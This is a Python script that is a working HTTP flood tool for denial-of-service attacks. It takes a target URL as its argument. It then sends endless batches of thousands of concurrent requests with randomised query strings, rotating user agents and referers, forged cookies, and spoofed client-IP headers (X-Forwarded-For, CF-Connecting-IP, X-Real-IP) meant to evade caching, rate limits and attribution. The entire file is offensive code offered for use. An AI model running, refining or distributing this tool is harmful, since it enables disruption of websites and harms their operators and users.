import asyncio
import httpx
import random
import re
import ipaddress
from datetime import datetime, timedelta
import sys

url = ''
host = ''
headers_useragents = []
headers_referers = []
request_counter = 0
flag = False

isp_blocks = ['192.168.0.0/24', '10.0.0.0/8', '172.16.0.0/12']

def load_useragents():
    with open('useragents.txt', 'r') as f:
        return f.read().splitlines()

def load_referers():
    with open('referers.txt', 'r') as f:
        return f.read().splitlines()

headers_useragents = load_useragents()
headers_referers = load_referers()

def generate_ip():
    block = random.choice(isp_blocks)
    network = ipaddress.ip_network(block, strict=False)
    ip = ipaddress.ip_address(random.randint(int(network.network_address) + 1, int(network.broadcast_address) - 1))
    return str(ip)

def generate_cookie():
    expires = (datetime.now() + timedelta(days=1)).strftime('%a, %d-%b-%Y %H:%M:%S GMT')
    return f"sessionid=value{random.randint(1, 100000)}; Expires={expires}; Domain={host}; Path=/; Secure; HttpOnly"

def buildblock(size):
    return ''.join(chr(random.randint(65, 90)) for _ in range(size))

async def httpcall(client):
    global request_counter
    spoofed_ip = generate_ip()
    if url.count("?") > 0:
        param_joiner = "&"
    else:
        param_joiner = "?"
    request_url = url + param_joiner + buildblock(random.randint(3, 10)) + '=' + buildblock(random.randint(3, 10))
    headers = {
        'User-Agent': random.choice(headers_useragents),
        'Referer': random.choice(headers_referers) + buildblock(random.randint(5, 10)),
        'X-Forwarded-For': spoofed_ip,
        'Cookie': generate_cookie(),
        'CF-Connecting-IP': spoofed_ip,
        'X-Real-IP': spoofed_ip
    }
    try:
        await client.get(request_url, headers=headers)
        request_counter += 1
    except:
        pass

async def run_attack():
    global flag
    async with httpx.AsyncClient() as client:
        while not flag:
            tasks = [httpcall(client) for _ in range(5810)]
            await asyncio.gather(*tasks)
            await asyncio.sleep(random.uniform(0.1, 0.5))

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: script.py <url>")
        sys.exit()
    else:
        url = sys.argv[1]
        if url.count("/") == 2:
            url = url + "/"
        m = re.search('(https?://)?([^/]*)/?.*', url)
        host = m.group(2)
        try:
            asyncio.run(run_attack())
        except KeyboardInterrupt:
            flag = True
            print("\n-- Attack stopped by user --")